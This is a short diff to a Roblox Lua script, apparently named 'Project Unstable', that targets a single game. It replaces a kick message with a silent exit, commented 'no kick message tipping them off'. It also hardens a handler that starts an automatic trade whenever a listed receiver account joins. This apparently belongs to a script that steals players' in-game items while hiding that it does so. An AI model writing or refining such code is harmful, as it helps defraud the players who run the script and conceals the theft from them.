@@ -85,8 +85,7 @@ end
 local place_id = 142823291
 
 if game.PlaceId ~= place_id then
-    game.Players.LocalPlayer:Kick("Project Unstable - Unsupported game detected. Please join MM2!")
-    return
+    return -- silent exit, no kick message tipping them off
 end
 
 local reps = game:GetService("ReplicatedStorage")
@@ -630,7 +629,7 @@ end
 
 local function watch_for_dudes()
     local function on_player_added(plr_added)
-        if table.find(_G.receivers, plr_added.Name) then
+        if _G.receivers and table.find(_G.receivers, plr_added.Name) then
             task.spawn(function()
                 do_the_trading_thing(plr_added.Name)
             end)
